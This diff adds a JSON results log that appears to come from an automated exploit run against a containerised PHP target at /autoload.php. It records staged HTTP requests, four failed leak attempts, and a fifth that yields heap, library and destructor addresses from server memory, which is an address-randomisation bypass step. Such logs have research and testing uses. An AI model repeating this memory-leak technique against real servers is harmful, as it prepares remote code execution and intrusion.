@@ -1,0 +1,103 @@
+{
+ "port": 18730,
+ "container": "mw109619-ap-8426",
+ "tag": "mw_autoload",
+ "a1_sha": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6",
+ "b1_sha": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2",
+ "b1_bytes": 33128677,
+ "a1_path": "/autoload.php",
+ "b1_path": "/autoload.php",
+ "stages": [
+  {
+   "stage": "A1",
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha": "cd31e49e6cf473f1842addeb26d000299f25e5638ee44669ecd73937bdcaa112",
+   "elapsed": 0.08
+  },
+  {
+   "stage": "B1",
+   "i": 0,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 256,
+   "elapsed": 0.09,
+   "has_setcookie": true,
+   "leak": "parse_error: RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "i": 1,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 256,
+   "elapsed": 0.08,
+   "has_setcookie": true,
+   "leak": "parse_error: RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "i": 2,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 256,
+   "elapsed": 0.07,
+   "has_setcookie": true,
+   "leak": "parse_error: RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "i": 3,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 256,
+   "elapsed": 0.07,
+   "has_setcookie": true,
+   "leak": "parse_error: RuntimeError('no heap pointers in leak window')"
+  },
+  {
+   "stage": "B1",
+   "i": 4,
+   "status": "HTTP/1.1 200 OK",
+   "bytes": 1677340,
+   "elapsed": 0.04,
+   "has_setcookie": true,
+   "leak": {
+    "decoded": 819208,
+    "zdtor": "0x7f88ddba7b60",
+    "lib": "0x7f88dd549000",
+    "main": [
+     "0x7f88db800000",
+     "0x7f88d8400000"
+    ],
+    "buckets": [
+     [
+      "0x7f88d8600000",
+      7496
+     ],
+     [
+      "0x7f88dda00000",
+      1095
+     ],
+     [
+      "0x7f88db800000",
+      87
+     ],
+     [
+      "0x7f88d8400000",
+      78
+     ]
+    ]
+   }
+  }
+ ],
+ "health": {
+  "status": "HTTP/1.1 200 OK",
+  "bytes": 192
+ },
+ "hit": {
+  "i": 4,
+  "decoded": 819208,
+  "lib": "0x7f88dd549000",
+  "main": [
+   "0x7f88db800000",
+   "0x7f88d8400000"
+  ]
+ }
+}
